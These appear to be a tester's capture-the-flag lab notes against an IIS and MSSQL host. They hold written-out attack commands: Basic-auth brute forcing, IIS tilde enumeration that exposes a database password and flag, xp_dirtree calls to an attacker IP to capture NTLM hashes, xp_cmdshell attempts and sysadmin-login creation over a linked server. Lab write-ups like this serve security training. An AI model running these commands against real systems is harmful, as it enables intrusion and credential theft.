# Nmap

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2056.00; RTM+
|_ssl-date: 2025-11-23T20:14:52+00:00; +3s from scanner time.
| ms-sql-ntlm-info: 
|   10.13.38.11:1433: 
|     Target_Name: POO
|     NetBIOS_Domain_Name: POO
|     NetBIOS_Computer_Name: COMPATIBILITY
|     DNS_Domain_Name: intranet.poo
|     DNS_Computer_Name: COMPATIBILITY.intranet.poo
|     DNS_Tree_Name: intranet.poo
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-23T03:06:02
| Not valid after:  2055-11-23T03:06:02
| MD5:   2cc3:fccd:d5c8:dbf5:c2da:c964:0fb6:6523
|_SHA-1: b2ab:67b4:d4ce:25e7:54d6:add2:3ce8:0694:9f5c:c26a
| ms-sql-info: 
|   10.13.38.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2056.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433
```
=> AD domain: `intranet.poo`
=> DNS Host name: `compatibility.intranet.poo`

UDP:
```bash
sudo nmap -v -Pn -sU -T4 -oN udp_ports.nmap compatibility.intranet.poo
```
=> no open ports

---
# HTTP / 80

DNS Name from Nmap MSSQL entry. Add to `/etc/hosts`:
```
10.13.38.11 compatibility.intranet.poo
```

Default IIS webpage:
```
http://compatibility.intranet.poo/
```

## Dir brute

Feroxbuster:
```bash
feroxbuster -u http://compatibility.intranet.poo/ -o feroxbuster_p80.txt
```
=> 401: `/admin`

Basic auth `/admin` :
![[Pasted image 20251123212212.png]]

Brute force Basic Auth:
```bash
hydra -I -e nsr -l admin -P /usr/share/wordlists/rockyou.txt "http-get://compatibility.intranet.poo/admin:A=BASIC:F=401"
```
=> nothing (tried users: "poo", "admin", "administrator")


Gobuster quick sweep:
```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://compatibility.intranet.poo/ -f
# /ADMIN/               (Status: 401) [Size: 1293]
# /Admin/               (Status: 401) [Size: 1293]
# /admin/               (Status: 401) [Size: 1293]
# /dev/                 (Status: 403) [Size: 1233]
# /images/              (Status: 403) [Size: 1233]
# /Images/              (Status: 403) [Size: 1233]
# /js/                  (Status: 403) [Size: 1233]
# /meta-inf/            (Status: 403) [Size: 1233]
# /META-INF/            (Status: 403) [Size: 1233]
# /plugins/             (Status: 403) [Size: 1233]
# /templates/           (Status: 403) [Size: 1233]
# /themes/              (Status: 403) [Size: 1233]
# /Themes/              (Status: 403) [Size: 1233]
# /uploads/             (Status: 403) [Size: 1233]
# /widgets/             (Status: 403) [Size: 1233]
```

## VHost fuzzing

```bash
ffuf -H "Host: FUZZ.intranet.poo" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.13.38.11 -fs 703

ffuf -H "Host: FUZZ" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.13.38.11 -fs 703
```
=> nothing

## Nikto

```bash
nikto --url http://compatibility.intranet.poo/
```

Results:
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.13.38.11
+ Target Hostname:    compatibility.intranet.poo
+ Target Port:        80
+ Start Time:         2025-11-23 23:01:21 (GMT1)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1446
+ 7825 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-11-23 23:10:48 (GMT1) (567 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
=> File: `/.DS_Store`

## ds_walk

```bash
python3 ~/Hacking/tools/DS_Walk/ds_walk.py -u http://compatibility.intranet.poo/
```
Results:
```
[!] .ds_store file is present on the webserver.
[+] Enumerating directories based on .ds_server file:
----------------------------
[!] http://compatibility.intranet.poo//admin
[!] http://compatibility.intranet.poo//dev
[!] http://compatibility.intranet.poo//iisstart.htm
[!] http://compatibility.intranet.poo//Images
[!] http://compatibility.intranet.poo//JS
[!] http://compatibility.intranet.poo//META-INF
[!] http://compatibility.intranet.poo//New folder
[!] http://compatibility.intranet.poo//New folder (2)
[!] http://compatibility.intranet.poo//Plugins
[!] http://compatibility.intranet.poo//Templates
[!] http://compatibility.intranet.poo//Themes
[!] http://compatibility.intranet.poo//Uploads
[!] http://compatibility.intranet.poo//web.config
[!] http://compatibility.intranet.poo//Widgets
----------------------------
[!] http://compatibility.intranet.poo//dev/304c0c90fbc6520610abbf378e2339d1
[!] http://compatibility.intranet.poo//dev/dca66d38fd916317687e1390a420c3fc
----------------------------
[!] http://compatibility.intranet.poo//dev/304c0c90fbc6520610abbf378e2339d1/core
[!] http://compatibility.intranet.poo//dev/304c0c90fbc6520610abbf378e2339d1/db
[!] http://compatibility.intranet.poo//dev/304c0c90fbc6520610abbf378e2339d1/include
[!] http://compatibility.intranet.poo//dev/304c0c90fbc6520610abbf378e2339d1/src
----------------------------
[!] http://compatibility.intranet.poo//dev/dca66d38fd916317687e1390a420c3fc/core
[!] http://compatibility.intranet.poo//dev/dca66d38fd916317687e1390a420c3fc/db
[!] http://compatibility.intranet.poo//dev/dca66d38fd916317687e1390a420c3fc/include
[!] http://compatibility.intranet.poo//dev/dca66d38fd916317687e1390a420c3fc/src
----------------------------
[!] http://compatibility.intranet.poo//Images/buttons
[!] http://compatibility.intranet.poo//Images/icons
[!] http://compatibility.intranet.poo//Images/iisstart.png
----------------------------
[!] http://compatibility.intranet.poo//JS/custom
----------------------------
[!] http://compatibility.intranet.poo//Themes/default
----------------------------
[!] http://compatibility.intranet.poo//Widgets/CalendarEvents
[!] http://compatibility.intranet.poo//Widgets/Framework
[!] http://compatibility.intranet.poo//Widgets/Menu
[!] http://compatibility.intranet.poo//Widgets/Notifications
----------------------------
[!] http://compatibility.intranet.poo//Widgets/Framework/Layouts
----------------------------
[!] http://compatibility.intranet.poo//Widgets/Framework/Layouts/custom
[!] http://compatibility.intranet.poo//Widgets/Framework/Layouts/default
----------------------------
[*] Finished traversing. No remaining .ds_store files present.
[*] Cleaning up .ds_store files saved to disk.
```
=> However none of the enumerated files/dirs are accessible (403 Forbidden)

## IIS Tilde vulnerability

Check if vulnerable:
```bash
shortscan --isvuln http://compatibility.intranet.poo/
# URL: http://compatibility.intranet.poo/
# Running: Microsoft-IIS/10.0
# Vulnerable: Yes!
```

Enum files (tried more paths from DS_walk output, but only the one with results is shown below):
```bash
shortscan 'http://compatibility.intranet.poo/dev/304c0c90fbc6520610abbf378e2339d1/db'
# POO_CO~1.TXT         POO_CO?.TXT?
```
=> there is a txt file which filename starts with `poo_co`

Create wordlist with words that start with "co":
```bash
grep "^co" /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt > poo.wordlist.txt
```

Brute force filenames:
```bash
ffuf -u http://compatibility.intranet.poo/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt -w poo.wordlist.txt
# connection
```

Access file:
```bash
curl http://compatibility.intranet.poo/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt
# SERVER=10.13.38.11
# USERID=external_user
# DBNAME=POO_PUBLIC
# USERPWD=#p00Public3xt3rnalUs3r#

# Flag : POO{fcfb0767f5bd3cbc22f40ff5011ad555}
```

---
# MSSQL / 1433

Connect:
```bash
impacket-mssqlclient external_user@compatibility.intranet.poo
# PW: #p00Public3xt3rnalUs3r#
```

Version:
```
select @@version;

Microsoft SQL Server 2017 (RTM-GDR) (KB5040942) - 14.0.2056.2 (X64) 
        Jun 20 2024 11:02:32 
        Copyright (C) 2017 Microsoft Corporation
        Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
```

Responder:
```
EXEC MASTER.sys.xp_dirtree '\\10.10.14.17\test', 1, 1;
EXEC MASTER.sys.xp_fileexist '\\10.10.14.17\test';
EXEC sp_OACreate 'WinHttp.WinHttpRequest.5.1', NULL, 1;
```
=> the commands dont work

## Linked Servers

There is another linked server `COMPATIBILITY\POO_CONFIG`:
```sql
enum_links
[%] EXEC sp_linkedservers
SRV_NAME                   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE             SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
------------------------   ----------------   -----------   ------------------------   ------------------   ------------   -------   
COMPATIBILITY\POO_CONFIG   SQLNCLI            SQL Server    COMPATIBILITY\POO_CONFIG   NULL                 NULL           NULL      
COMPATIBILITY\POO_PUBLIC   SQLNCLI            SQL Server    COMPATIBILITY\POO_PUBLIC   NULL                 NULL           NULL
```

Enumerate databases:
```sql
EXEC ('select name from sys.databases;') AT [COMPATIBILITY\POO_CONFIG];
[%] EXEC ('select name from sys.databases;') AT [COMPATIBILITY\POO_CONFIG];
name         
----------   
master       
tempdb       
POO_CONFIG
```

Enumerate tables:
```bash
EXEC ('select * from POO_CONFIG.information_schema.tables;') AT [COMPATIBILITY\POO_CONFIG];
# none

EXEC ('SELECT COUNT(*) FROM POO_CONFIG.information_schema.tables;') AT [COMPATIBILITY\POO_CONFIG];
# 0
```
=> no tables

Further enum:
```bash
EXEC ('select @@version;') AT [COMPATIBILITY\POO_CONFIG];
# same version

# Cmd exec?
EXEC ('EXECUTE xp_cmdshell ''whoami'';') AT [COMPATIBILITY\POO_CONFIG];
# denied
EXEC ('EXECUTE sp_configure ''show advanced options'', 1;') AT [COMPATIBILITY\POO_CONFIG];
# denied

# Credentials?
EXEC ('SELECT * FROM msdb.dbo.syscachedcredentials;') AT [COMPATIBILITY\POO_CONFIG];
# denied

# Backups?
EXEC ('SELECT * FROM msdb.dbo.backupfile;') AT [COMPATIBILITY\POO_CONFIG];
# none

# Coerce auth?
EXEC ('EXEC MASTER.sys.xp_dirtree ''\\10.10.14.17\test'', 1, 1;') AT [COMPATIBILITY\POO_CONFIG];
# nope
EXEC ('EXEC MASTER.sys.xp_fileexist ''\\10.10.14.17\test'';') AT [COMPATIBILITY\POO_CONFIG];
# nope
EXEC ('EXEC sp_OACreate ''WinHttp.WinHttpRequest.5.1'', NULL, 1;') AT [COMPATIBILITY\POO_CONFIG];
# perm denied

# Jobs
EXEC ('EXEC xp_servicecontrol ''QUERYSTATE'', ''SQLServerAgent'';') AT [COMPATIBILITY\POO_CONFIG];
# denied
EXEC ('EXEC msdb.dbo.sp_help_job;') AT [COMPATIBILITY\POO_CONFIG];
# denied

EXEC ('EXEC sp_linkedservers;') AT [COMPATIBILITY\POO_CONFIG];
# same linked servers

EXEC ('SELECT SYSTEM_USER AS CurrentLogin;') AT [COMPATIBILITY\POO_CONFIG];
# internal_user

# Creds?
EXEC ('SELECT name, password_hash FROM sys.sql_logins WHERE name = SYSTEM_USER;') AT [COMPATIBILITY\POO_CONFIG];
# nothing

# Stored Procedures?
EXEC ('SELECT name FROM dbo.sysobjects WHERE (type = ''P'') AND LEFT(name, 3) NOT IN (''sp_'', ''xp_'', ''ms_'');') AT [COMPATIBILITY\POO_CONFIG];
# none
EXEC ('SELECT name FROM sys.procedures WHERE name LIKE ''xp%'';') AT [COMPATIBILITY\POO_CONFIG];
# none

EXEC ('SELECT job_id, name, enabled FROM msdb.dbo.sysjobs;') AT [COMPATIBILITY\POO_CONFIG];
# denied

EXEC ('CREATE LOGIN newadmin WITH PASSWORD = ''password''; ALTER SERVER ROLE sysadmin ADD MEMBER newadmin;') AT [COMPATIBILITY\POO_CONFIG];
# denied

EXEC ('SELECT * FROM OPENROWSET(BULK N''C:/Windows/System32/drivers/etc/hosts'', SINGLE_CLOB) AS Contents;') AT [COMPATIBILITY\POO_CONFIG];
# denied

EXEC ('DECLARE @value nvarchar(4000); EXEC MASTER.sys.xp_regread ''HKEY_LOCAL_MACHINE'',''SOFTWARE\Microsoft\Windows NT\CurrentVersion'',''ProductName'',@value OUTPUT; SELECT @value AS WindowsVersion;') AT [COMPATIBILITY\POO_CONFIG];
# denied

EXEC ('SELECT * FROM master.dbo.spt_fallback_db;') AT [COMPATIBILITY\POO_CONFIG];
EXEC ('SELECT * FROM master.dbo.spt_fallback_dev;') AT [COMPATIBILITY\POO_CONFIG];
EXEC ('SELECT * FROM master.dbo.spt_fallback_usg;') AT [COMPATIBILITY\POO_CONFIG];
EXEC ('SELECT * FROM sys.backup_devices;') AT [COMPATIBILITY\POO_CONFIG];
# nothing
EXEC ('EXEC master.dbo.sp_monitor;') AT [COMPATIBILITY\POO_CONFIG];
# denied

EXEC ('SELECT name FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER(''sysadmin'', name) = 1;') AT [COMPATIBILITY\POO_CONFIG];
# sa

EXEC ('SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE ''%password%'';') AT [COMPATIBILITY\POO_CONFIG];

EXEC ('SELECT name AS DatabaseName, is_trustworthy_on, SUSER_SNAME(owner_sid) AS DatabaseOwner FROM sys.databases ORDER BY is_trustworthy_on DESC;') AT [COMPATIBILITY\POO_CONFIG];

```
